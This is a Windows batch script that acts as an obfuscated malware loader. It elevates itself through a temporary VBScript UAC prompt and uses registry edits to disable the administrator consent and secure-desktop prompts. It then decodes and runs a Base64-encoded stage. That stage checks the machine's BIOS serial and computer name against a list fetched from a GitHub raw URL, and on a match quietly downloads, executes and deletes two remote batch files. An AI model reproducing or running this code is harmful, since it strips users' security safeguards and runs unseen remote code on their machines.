@echo off
set "params=%*"
cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f
powershell -Command "& { $encoded2 = 'QGVjaG8gb2ZmDQpzZXQgInBhcmFtcz0lKiINCmNkIC9kICIlfmRwMCIgJiYgKCBpZiBleGlzdCAiJXRlbXAlXGdldGFkbWluLnZicyIgZGVsICIldGVtcCVcZ2V0YWRtaW4udmJzIiApICYmIGZzdXRpbCBkaXJ0eSBxdWVyeSAlc3lzdGVtZHJpdmUlIDE+bnVsIDI+bnVsIHx8ICggIGVjaG8gU2V0IFVBQyA9IENyZWF0ZU9iamVjdF4oIlNoZWxsLkFwcGxpY2F0aW9uIl4pIDogVUFDLlNoZWxsRXhlY3V0ZSAiY21kLmV4ZSIsICIvayBjZCAiIiV+c2RwMCIiICYmICV+czAgJXBhcmFtcyUiLCAiIiwgInJ1bmFzIiwgMSA+PiAiJXRlbXAlXGdldGFkbWluLnZicyIgJiYgIiV0ZW1wJVxnZXRhZG1pbi52YnMiICYmIGV4aXQgL0IgKQ0KcmVnIGFkZCBIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFBvbGljaWVzXFN5c3RlbSAvdiBDb25zZW50UHJvbXB0QmVoYXZpb3JBZG1pbiAvdCBSRUdfRFdPUkQgL2QgMCAvZg0KcmVnIGFkZCBIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFBvbGljaWVzXFN5c3RlbSAvdiBQcm9tcHRPblNlY3VyZURlc2t0b3AgL3QgUkVHX0RXT1JEIC9kIDAgL2YNCnNldCAidXJsPWh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9taXR1a2l0aWkvdGVzdC9tYWluL2NoZWNrLnR4dCINCnNldCAidGVtcGZpbGU9JXRlbXAlXGNoZWNrLnR4dCINCnBvd2Vyc2hlbGwgLUNvbW1hbmQgIihOZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50KS5Eb3dubG9hZEZpbGUoJyV1cmwlJywgJyV0ZW1wZmlsZSUnKSINCmlmIG5vdCBleGlzdCAiJXRlbXBmaWxlJSIgKA0KICAgIGVjaG8gS2hvbmcgdGFpIGRjIGZpbGUudHh0Lg0KICAgIGdvdG8gOmNsZWFudXANCikNCmZvciAvZiAidG9rZW5zPSoiICUlaSBpbiAoJ3Bvd2Vyc2hlbGwgLUNvbW1hbmQgIihHZXQtQ2ltSW5zdGFuY2UgLUNsYXNzTmFtZSBXaW4zMl9CSU9TKS5TZXJpYWxOdW1iZXIiJykgZG8gc2V0ICJzZXJpYWw9JSVpIg0KZm9yIC9mICJ0b2tlbnM9KiIgJSVpIGluICgncG93ZXJzaGVsbCAtQ29tbWFuZCAiKEdldC1DaW1JbnN0YW5jZSAtQ2xhc3NOYW1lIFdpbjMyX0NvbXB1dGVyU3lzdGVtKS5OYW1lIicpIGRvIHNldCAiZGV2aWNlPSUlaSINCmVjaG8gU2VyaWFsIE51bWJlcjogJXNlcmlhbCUNCmVjaG8gRGV2aWNlIE5hbWU6ICVkZXZpY2UlDQplY2hvIE5vaSBEdW5nIGZpbGUgY2hlY2sudHh0Og0KdHlwZSAiJXRlbXBmaWxlJSINCnNldCAiZm91bmQ9MCINCmZvciAvZiAidG9rZW5zPSoiICUlaiBpbiAoJ3R5cGUgIiV0ZW1wZmlsZSUiJykgZG8gKA0KICAgIGlmIC9pICIlJWoiPT0iJXNlcmlhbCUiIHNldCAiZm91bmQ9MSINCiAgICBpZiAvaSAiJSVqIj09IiVkZXZpY2UlIiBzZXQgImZvdW5kPTEiDQopDQppZiAlZm91bmQlPT0xICgNCiAgICBlY2hvIFRydW5nIEtob3ANCnN0YXJ0IC9taW4gcG93ZXJzaGVsbCAtQ29tbWFuZCAiJHVybDEgPSAnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL21pdHVraXRpaS90ZXN0L21haW4vYmFja3VwLmJhdCc7ICR0ZW1wUGF0aDEgPSBbU3lzdGVtLklPLlBhdGhdOjpDb21iaW5lKCRlbnY6VEVNUCwgJ2JhY2t1cC5iYXQnKTsgSW52b2tlLVdlYlJlcXVlc3QgLVVyaSAkdXJsMSAtT3V0RmlsZSAkdGVtcFBhdGgxOyBTdGFydC1Qcm9jZXNzICR0ZW1wUGF0aDEgLVdhaXQ7IFJlbW92ZS1JdGVtICR0ZW1wUGF0aDEiDQpzdGFydCAvbWluIHBvd2Vyc2hlbGwgLUNvbW1hbmQgIiR1cmwyID0gJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9taXR1a2l0aWkvdGVzdC9tYWluL2JhY2t1cDIuYmF0JzsgJHRlbXBQYXRoMiA9IFtTeXN0ZW0uSU8uUGF0aF06OkNvbWJpbmUoJGVudjpURU1QLCAnYmFja3VwMi5iYXQnKTsgSW52b2tlLVdlYlJlcXVlc3QgLVVyaSAkdXJsMiAtT3V0RmlsZSAkdGVtcFBhdGgyOyBTdGFydC1Qcm9jZXNzICR0ZW1wUGF0aDIgLVdhaXQ7IFJlbW92ZS1JdGVtICR0ZW1wUGF0aDIiDQoNCikgZWxzZSAoDQogICAgZWNobyBLaG9uZyBUcnVuZyBLaG9wLg0KKQ0KOmNsZWFudXANCmlmIGV4aXN0ICIldGVtcGZpbGUlIiBkZWwgIiV0ZW1wZmlsZSUiDQpzZXQgInVybD0iDQpzZXQgInRlbXBmaWxlPSINCnNldCAic2VyaWFsPSINCnNldCAiZGV2aWNlPSINCnNldCAiZm91bmQ9Ig0KZGVsIC9mIC9xICIldGVtcCVcY2hlY2sudHh0Ig0KZWNobyBIb2FuIFRoYW5oDQpleGl0'; $decoded2 = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($encoded2)); $decoded2 | Out-File -FilePath '%TEMP%\temp2.bat' -Encoding ASCII; Start-Process '%TEMP%\temp2.bat' -Wait; Remove-Item '%TEMP%\temp2.bat' -Force; }"
exit
